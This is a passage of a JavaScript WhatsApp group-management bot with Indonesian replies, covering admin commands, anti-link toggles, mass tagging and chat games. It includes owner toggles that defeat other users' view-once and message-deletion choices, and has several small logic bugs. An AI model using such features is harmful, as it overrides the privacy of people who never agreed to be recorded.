if (!isCreator) return newReply('Fitur Khusus owner!')
if (!quoted) return newReply(`Reply foto dgn caption ${prefix + command}`)
if (!/image/.test(mime)) return newReply(`Reply foto dgn caption ${prefix + command}`)
if (/webp/.test(mime)) return newReply(`Reply foto dgn caption ${prefix + command}`)
let media = await juna.downloadAndSaveMediaMessage(quoted)
var { img } = await generateProfilePicture(media)
await juna.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
} 
]
})
newReply("Done!!!")
}
break
case 'pppanjanggc': case 'ppgcfull': case 'setppgc2':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
if (!quoted) return newReply(`Reply foto dgn caption ${prefix + command}`)
if (!/image/.test(mime)) return newReply(`Reply foto dgn caption ${prefix + command}`)
if (/webp/.test(mime)) return newReply(`Reply foto dgn caption ${prefix + command}`)
let media = await juna.downloadAndSaveMediaMessage(quoted)
var { img } = await generateProfilePicture(media)
await juna.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
} 
]
})
newReply("Done!!!")
}
break
case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
if (!quoted) return newReply (`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return newReply (`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return newReply (`Kirim/Reply Image Dengan Caption ${prefix + command}`)
let media = await juna.downloadAndSaveMediaMessage(quoted)
await juna.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
newReply("Berhasil mengganti pp group")
}
break
case 'setname': case 'setsubject': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
if (!text) return newReply(`Example ${prefix + command} WhatsApp Bot`)
await juna.groupUpdateSubject(m.chat, text).then((res) => newReply("Done")).catch((err) => newReply(jsonformat(err)))
}
break
case 'sc':
case 'source': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
sc = fs.readFileSync('./media/sound/sc.mp3')
juna.sendMessage(m.chat, {audio: sc, mimetype:'audio/mpeg', ptt:true }, {quoted: m})
}
break
case 'setdesc': case 'setdesk': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
if (!text) return newReply(`Example ${prefix + command} WhatsApp Bot`)
await juna.groupUpdateDescription(m.chat, text).then((res) => newReply("Done")).catch((err) => newReply(jsonformat(err)))
}
break
case'autoaigrup':case "aigrup": case'autoaigc':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#autoaigrup', m.sender, _cmd)
if (isAutoAiGc) return newReply(`Udah aktif`)
openaigc.push(m.chat)
fs.writeFileSync('./database/openaigc.json', JSON.stringify(openaigc, null, 2))
newReply('Successfully Activate Auto AI')
} else if (args[0] === "off") {
addCountCmd('#autoaigrup', m.sender, _cmd)
if (!isAutoAiGc) return newReply(`Udah nonaktif`)
let anu = openaigc.indexOf(m.chat)
openaigc.splice(anu, 1)
fs.writeFileSync('./database/openaigc.json', JSON.stringify(openaigc, null, 2))
newReply('Successfully Disabling Auto AI')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'autodlgc':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#autodlgc', m.sender, _cmd)
if (isAutoDlGc) return newReply(`Udah aktif`)
autodlgc.push(m.chat)
fs.writeFileSync('./database/autodlgc.json', JSON.stringify(autodlgc, null, 2))
newReply('Successfully Activate Auto Downloader')
} else if (args[0] === "off") {
addCountCmd('#autodlgc', m.sender, _cmd)
if (!isAutoDlGc) return newReply(`Udah nonaktif`)
let anu = autodlgc.indexOf(m.chat)
autodlgc.splice(anu, 1)
fs.writeFileSync('./database/autodlgc.json', JSON.stringify(autodlgc, null, 2))
newReply('Successfully Disabling Auto Downloader')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case'autoaijapri':case "aipc": case'autoaipc':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (m.isGroup) return newReply('Fitur Khusus Japri!')
if (!isCreator) return newReply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#autoaijapri', m.sender, _cmd)
if (isAutoAiPc) return newReply(`Udah aktif`)
openaipc.push(botNumber)
fs.writeFileSync('./database/openaipc.json', JSON.stringify(openaipc, null, 2))
newReply('Successfully Activate Auto AI')
} else if (args[0] === "off") {
addCountCmd('#autoaijapri', m.sender, _cmd)
if (!isAutoAiPc) return newReply(`Udah nonaktif`)
let anu = openaipc.indexOf(botNumber)
openaipc.splice(anu, 1)
fs.writeFileSync('./database/openaipc.json', JSON.stringify(openaipc, null, 2))
newReply('Successfully Disabling Auto AI')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case'antilink':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
if (args[0] === "on") {
addCountCmd('#antilink', m.sender, _cmd)
if (isAntiLink) return newReply(`Udah aktif`)
antilink.push(m.chat)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
newReply('Successfully Activate Antilink In This Group')
} else if (args[0] === "off") {
addCountCmd('#antilink', m.sender, _cmd)
if (!isAntiLink) return newReply(`Udah nonaktif`)
let anu = antilink.indexOf(m.chat)
antilink.splice(anu, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
newReply('Successfully Disabling Antilink In This Group')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case'antilinktt':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
if (args[0] === "on") {
addCountCmd('#antilink2', m.sender, _cmd)
if (isAntiLink2) return newReply(`Udah aktif`)
antilink2.push(m.chat)
fs.writeFileSync('./database/antilink2.json', JSON.stringify(antilink2, null, 2))
newReply('Successfully Activate antilink2 In This Group')
} else if (args[0] === "off") {
addCountCmd('#antilink2', m.sender, _cmd)
if (!isAntiLink2) return newReply(`Udah nonaktif`)
let anu = antilink2.indexOf(m.chat)
antilink2.splice(anu, 1)
fs.writeFileSync('./database/antilink2.json', JSON.stringify(antilink2, null, 2))
newReply('Successfully Disabling antilink2 In This Group')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case'kickme':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
if (args[0] === "on") {
addCountCmd('#kickme', m.sender, _cmd)
if (isKickMe) return newReply(`Udah aktif`)
kickme.push(m.chat)
fs.writeFileSync('./database/kickme.json', JSON.stringify(kickme, null, 2))
newReply('Successfully Activate Kickme In This Group')
} else if (args[0] === "off") {
addCountCmd('#kickme', m.sender, _cmd)
if (!isKickMe) return newReply(`Udah nonaktif`)
let anu = kickme.indexOf(m.chat)
kickme.splice(anu, 1)
fs.writeFileSync('./database/kickme.json', JSON.stringify(kickme, null, 2))
newReply('Successfully Disabling Kickme In This Group')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case'mute':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (args[0] === "on") {
addCountCmd('#mute', m.sender, _cmd)
if (isMute) return newReply(`Udah Mute`)
mute.push(m.chat)
fs.writeFileSync('./database/mute.json', JSON.stringify(mute, null, 2))
newReply('Successfully Mute In This Group')
}
else if (args[0] === "off") {
addCountCmd('#mute', m.sender, _cmd)
if (!isMute) return newReply(`Udah Unmute`)
let anu = mute.indexOf(m.chat)
mute.splice(anu, 1)
fs.writeFileSync('./database/mute.json', JSON.stringify(mute, null, 2))
newReply('Successfully Unmute In This Group')
}else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case'antidelete':{
// if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator) return newReply('Fitur Khusus owner!')
//if (!isBotAdmins) return newReply(mess.BotAdmin)
if (args[0] === "on") {
addCountCmd('#antidelete', m.sender, _cmd)
if (setting.antiDelete) return newReply(`Udah aktif`)
setting.antiDelete = true
newReply('Successfully Activate antidelete In This bot')
} else if (args[0] === "off") {
addCountCmd('#antidelete', m.sender, _cmd)
if (!setting.antiViewOnce) return newReply(`Udah nonaktif`)
setting.antiDelete = false
newReply('Successfully Disabling antidelete In This bot')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}
}
break
case'antionce':case 'antivo': case 'antiviewonce':{
// if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator) return newReply('Fitur Khusus owner!')
// if (!isBotAdmins) return newReply(mess.BotAdmin)
if (args[0] === "on") {
addCountCmd('#antionce', m.sender, _cmd)
if (setting.antiViewOnce) return newReply(`Udah aktif`)
setting.antiViewOnce = true
newReply('Successfully Activate Anti view once In This bot')
} else if (args[0] === "off") {
addCountCmd('#antionce', m.sender, _cmd)
if (!setting.antiViewOnce) return newReply(`Udah nonaktif`)
setting.antiViewOnce = false
newReply('Successfully Disabling Anti view once In This bot')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}
}
break
case'antiwame':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
 if (args[0] === "on") {
addCountCmd('#antiwame', m.sender, _cmd)
if (isAntiWame) return newReply(`Udah aktif`)
antiwame.push(m.chat)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame, null, 2))
newReply('Successfully Activate Antiwame In This Group')
} else if (args[0] === "off") {
addCountCmd('#antiwame', m.sender, _cmd)
if (!isAntiWame) return newReply(`Udah nonaktif`)
let anu = antiwame.indexOf(m.chat)
antiwame.splice(anu, 1)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame, null, 2))
newReply('Successfully Disabling Antiwame In This Group')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case'antiwame2':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
 if (args[0] === "on") {
addCountCmd('#antiwame2', m.sender, _cmd)
if (isAntiWame2) return newReply(`Udah aktif`)
antilink.push(m.chat)
fs.writeFileSync('./database/antiwame2.json', JSON.stringify(antiwame2, null, 2))
newReply('Successfully Activate antiwame2 In This Group')
} else if (args[0] === "off") {
addCountCmd('#antiwame2', m.sender, _cmd)
if (!isAntiWame2) return newReply(`Udah nonaktif`)
let anu = antiwame2.indexOf(m.chat)
antiwame2.splice(anu, 1)
fs.writeFileSync('./database/antiwame2.json', JSON.stringify(antiwame2, null, 2))
newReply('Successfully Disabling antiwame2 In This Group')
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'opentime': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Lu Siapa Kocak')
if (!isBotAdmins) return newReply(mess.BotAdmin)
if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'hari') {
var timer = args[0] * `86400000`
} else {
return newReply('*Pilih:*\ndetik\nmenit\njam\n\n*Example*\n10 detik')
}
newReply(`Grup Akan Dibuka Dalam ${q} Dimulai Dari Sekarang`)
setTimeout(() => {
var nomor = m.participant
const open = `Grup Telah Di Buka Oleh Admin\nSekarang Semua Member Dapat Mengirim Pesan`
juna.groupSettingUpdate(m.chat, 'not_announcement')
newReply(open)
}, timer)
}
break
case'open': case'buka':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
addCountCmd('#group', m.sender, _cmd)
juna.groupSettingUpdate(m.chat, 'not_announcement')
const textOpen = await getTextSetOpen(m.chat, set_open);
newReply(textOpen || `Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
break
}
case'setopen':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator) return newReply('Fitur Khusus owner!')
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *teks open*\n\n_Contoh_\n\n${prefix+command} Halo Semuanya, group sudah buka`)
if (isSetOpen(m.chat, set_open)) return newReply(`Set open sudah ada sebelumnya`)
addSetOpen(text, m.chat, set_open)
addCountCmd('#setopen', m.sender, _cmd)
newReply(`✅ Done set open!`)
}
break
case 'changeopen': case 'changesetopen':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator) return newReply('Fitur Khusus owner!')
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *teks open*\n\n_Contoh_\n\n${prefix+command} Halo Semuanya, group sudah buka`)
if (isSetOpen(m.chat, set_open)) {
addCountCmd('#changeopen', m.sender, _cmd)
changeSetOpen(text, m.chat, set_open)
newReply(`Sukses ubah set open teks!`)
} else {
addCountCmd('#changeopen', m.sender, _cmd)
addSetOpen(text, m.chat, set_open)
newReply(`Sukses ubah set open teks!`)
}
break
case 'delsetopen':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator) return newReply('Fitur Khusus owner!')
if (!isSetOpen(m.chat, set_open)) return newReply(`Belum ada set open di sini..`)
removeSetOpen(m.chat, set_open)
addCountCmd('#delsetopen', m.sender, _cmd)
newReply(`Sukses delete set open`)
break
case 'closetime': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Lu Siapa Kocak')
if (!isBotAdmins) return newReply(mess.BotAdmin)
if (args[1] == 'detik') {
var timer = args[0] * `1000`
} else if (args[1] == 'menit') {
var timer = args[0] * `60000`
} else if (args[1] == 'jam') {
var timer = args[0] * `3600000`
} else if (args[1] == 'harj') {
var timer = args[0] * `86400000`
} else {
return newReply('*Pilih:*\ndetik\nmenit\njam\n\n*Example*\n10 detik')
}
newReply(`Group Akan Ditutup Dalam ${q} Di Mulai Dari Sekarang`)
setTimeout(() => {
var nomor = m.participant
const close = `Grup Di Tutup Oleh Admin\nSekarang Hanya Admin Yang Dapat Mengirim Pesan`
juna.groupSettingUpdate(m.chat, 'announcement')
newReply(close)
}, timer)
}
break
case 'pengingat': {
  if (isBan) return newReply('Lu di ban kocak awokwok') 

  atas = text.split('|')[0] ? text.split('|')[0] : '-'
  bawah = text.split('|')[1] ? text.split('|')[1] : '-'
  if (args[1] == 'detik') {
  var timer = args[0] * `1000`
  } else if (args[1] == 'menit') {
  var timer = args[0] * `60000`
  } else if (args[1] == 'jam') {
  var timer = args[0] * `3600000`
  } else if (args[1] == 'hari') {
  var timer = args[0] * `86400000`
  } else {
  
  return newReply('Gunakan dengan .pengingat berapa jam menit detik hari')
  }
  newReply(`Lu akan di virtex oleh bot dalam ${atas} Di Mulai Dari Sekarang awkaowkawokawoawkok :v`)
  setTimeout(() => {
  juna.sendMessage(m.chat, { text : q ? q : 'test' , mentions: participants.map(a => a.id)}, { quoted: fkontak })
  }, timer)
  }
break
case'close': case'tutup':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
addCountCmd('#close', m.sender, _cmd)
juna.groupSettingUpdate(m.chat, 'announcement')
const textClose = await getTextSetClose(m.chat, set_close);
newReply(textClose || `Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
break
case 'setclose':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator) return newReply('Fitur Khusus owner!')
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *teks close*\n\n_Contoh_\n\n${prefix+command} Halo Semuanya, group close dulu ya`)
if (isSetClose(m.chat, set_close)) return newReply(`Set close sudah ada sebelumnya`)
addSetClose(text, m.chat, set_close)
addCountCmd('#setclose', m.sender, _cmd)
newReply(`✅ Done set close!`)
}
break
case'changeclose': case'changesetclose':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator) return newReply('Fitur Khusus owner!')
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *teks close*\n\n_Contoh_\n\n${prefix+command} Halo Semuanya, group close dulu ya`)
if (isSetClose(m.chat, set_close)) {
addCountCmd('#changeclose', m.sender, _cmd)
changeSetClose(text, m.chat, set_close)
newReply(`Sukses ubah set close teks!`)
} else {
addCountCmd('#changeclose', m.sender, _cmd)
addSetClose(text, m.chat, set_close)
newReply(`Sukses ubah set close teks!`)
}
break
case 'delsetclose':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator) return newReply('Fitur Khusus owner!')
if (!isSetClose(m.chat, set_close)) return newReply(`Belum ada set close di sini..`)
removeSetClose(m.chat, set_close)
addCountCmd('#delsetclose', m.sender, _cmd)
newReply(`Sukses delete set close`)
break
case 'kick': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await juna.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => newReply('Sukses kick target✅')).catch((err) => newReply('Tag/reply pesan target yang ingin di kick!'))
}
break
case 'add': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await juna.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => newReply('Sukses add member✅')).catch((err) => newReply('❌ Terjadi kesalahan, mungkin nmr nya privat'))
}
break
case 'promote': case 'pm': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await juna.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => newReply('Sukses promote member✅')).catch((err) => newReply('❌ Terjadi kesalahan'))
}
break
case 'demote': case 'dm': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isCreator && !isAdmins) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await juna.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => newReply('Sukses demote admin✅')).catch((err) => newReply('❌ Terjadi kesalahan'))
}
break
case'revoke':
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
addCountCmd('#revoke', m.sender, _cmd)
await juna.groupRevokeInvite(m.chat)
.then( res => {
newReply(`Sukses menyetel tautan undangan grup ini`)
}).catch(() => newReply(mess.error.api))
break
case 'tagall': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply ('Lu Siapa?') 
if (!isBotAdmins) return newReply ('Bot Harus Jad Admin!') 
let teks = `*👥 Tag All By Admin*
 
🗞️ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `• @${mem.id.split('@')[0]}\n`
}
juna.sendMessage(m.chat, {
text: teks,
mentions: participants.map(a => a.id)
}, {
quoted: m
})
}
break
case 'hidetag': case 'h': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Lu siapa kocak?')
juna.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: fkontak })
}
break
case 'delete': case 'd': case 'del': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.quoted) throw false
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (!isBotAdmins) return newReply(mess.BotAdmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await juna.sendMessage(m.chat, { delete: { remoteJid: m.chat, id: m.quoted.id, participant: m.quoted.sender } })
}
break
case 'selfdelete': case 'selfd': case 'selfdel': {
if (!m.quoted) throw false
if (!isCreator) return m.reply('Fitur Khusus Owner!') 
let { chat, fromMe, id, isBaileys } = m.quoted
if (!isBaileys) return m.reply( 'Pesan tersebut bukan dikirim oleh bot!')
juna.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
}
break
case 'checksewa': case'ceksewa': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isSewa) return newReply(`Bot tidak di sewa group ini!`)
addCountCmd('#checksewa', m.sender, _cmd)
let ceksewa = ms(_sewa.getSewaExpired(m.chat, sewa) - Date.now())
let sewanya = `*Expire :* ${ceksewa.days} day(s) ${ceksewa.hours} hour(s) ${ceksewa.minutes} minute(s)`
newReply(sewanya)
}
break
// Game Menu
case 'ttc': case 'ttt': case 'tictactoe': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
let TicTacToe = require("./lib/tictactoe")
this.game = this.game ? this.game : {}
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return newReply( 'Kamu masih didalam game')
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
if (room) {
newReply('Partner ditemukan!')
room.o = m.chat
room.game.playerO = m.sender
room.state = 'PLAYING'
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if (room.x !== room.o) await juna.sendText(room.x, str, m, { mentions: parseMention(str) } )
await juna.sendText(room.o, str, m, { mentions: parseMention(str) } )
} else {
room = {
id: 'tictactoe-' + (+new Date),
x: m.chat,
o: '',
game: new TicTacToe(m.sender, 'o'),
state: 'WAITING'
}
if (text) room.name = text
newReply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${prefix+command} ${text}` : ''))
this.game[room.id] = room
}
}
break
case 'delttc': case 'delttt': {
if (isBan) return newReply('Lu di ban kocak awokwok') 
let roomnya = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
if (!roomnya) return newReply ( `Kamu sedang tidak berada di room tictactoe !`)
delete this.game[roomnya.id]
newReply(`Berhasil delete session room tictactoe !`)
}
break
case'casino':{
if (isBan) return newReply('Lu di ban kocak awokwok') 
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (isGame(m.sender, isCreator, gcount, glimit)) return newReply(`Limit game kamu sudah habis`)
if (!text) return newReply(`Kirim perintah *${prefix+command}* @tag nominal`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (fs.existsSync(`./database/${m.chat}.json`)) return newReply(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan\nKetik *${prefix}delcasino*, untuk menghapus sesi`)
if (!args[1]) return newReply('Masukan Nominal Nya')
if (args[1].includes('-')) return newReply(`Jangan menggunakan -`)
if (isNaN(parseInt(args[1]))) return newReply('Nominal Harus Berupa Angka!')
var anu = getBalance(m.sender, balance)
var ani = getBalance(m.mentionedJid[0], balance)
if (anu < args[1] || anu == 'undefined') return newReply(`Balance Tidak Mencukupi, Kumpulkan Terlebih Dahulu\nKetik ${prefix}balance, untuk mengecek Balance mu!`)
if (ani < args[1] || ani == 'undefined') return newReply(`Balance Lawan Tidak Mencukupi Untuk Bermain Denganmu\nKetik ${prefix}balance @tag untuk mengecek Balance lawanmu`)
var casinoo = setCasino(`${m.chat}`)
casinoo.Z = m.sender.replace("@s.whatsapp.net", "")
casinoo.Y = users
casinoo.nominal = parseInt(args[1])
addCountCmd('#casino', m.sender, _cmd)
fs.writeFileSync(`./database/casino/${m.chat}.json`, JSON.stringify(casinoo, null, 2))
gameAdd(m.sender, glimit)
var starGame = `🎰 Memulai Game Casino 💰\n\n• @${m.sender.replace("@s.whatsapp.net", "")} Menantang ${text}, dengan Nominal: *$ ${parseInt(args[1])}*\n• Ketik Y/N untuk menerima atau menolak Permainan!`
juna.sendMessage(m.chat, { text: starGame, mentions: [m.sender, users] }, { quoted: m })
}
 break
 case 'nikah':{
  // req nikah
  if (isBan) return newReply('Lu diban kocak akwaowkawoawoawk')
  if (!m.isGroup) return newReply('Fitur nikah hanya dapat digunakan di grup!')
  if (!text) return newReply(`Tag orang yang ingin dilamar dengan cara ${prefix+command} @tag`)
  let yangdilamar = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
  var nikah = setNikah(`${m.chat}`)
  nikah.pelamar = m.sender.replace("@s.whatsapp.net", "")
  nikah.yangdilamaar = yangdilamar
  addCountCmd('#nikah', m.sender, _cmd)
  fs.writeFileSync(`./database/nikah/${m.chat}.json`, JSON.stringify(nikah, null, 2))
  var starGame = `@${m.sender.replace("@s.whatsapp.net", "")} Mengajak ${text} untuk menikah,ketik Y untuk menerima atau N untuk menolak!`
  juna.sendMessage(m.chat, { text: starGame, mentions: [m.sender, yangdilamar] }, { quoted: m })


 }
 break
 case 'nikahgpt': {
  // req nikah
  if (isBan) return newReply('Lu diban kocak akwaowkawoawoawk')
  if (!m.isGroup) return newReply('Fitur nikah hanya dapat digunakan di grup!')
  if (!text) return newReply(`Tag orang yang ingin dilamar dengan cara ${prefix+command} @tag`)
  let yangdilamar = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
  var nikah = setNikah(`${m.chat}`)
  nikah.pelamar = m.sender.replace("@s.whatsapp.net", "")
  nikah.yangdilamaar = yangdilamar
  addCountCmd('#nikah', m.sender, _cmd)
  fs.writeFileSync(`./database/nikah/${m.chat}.json`, JSON.stringify(nikah, null, 2))
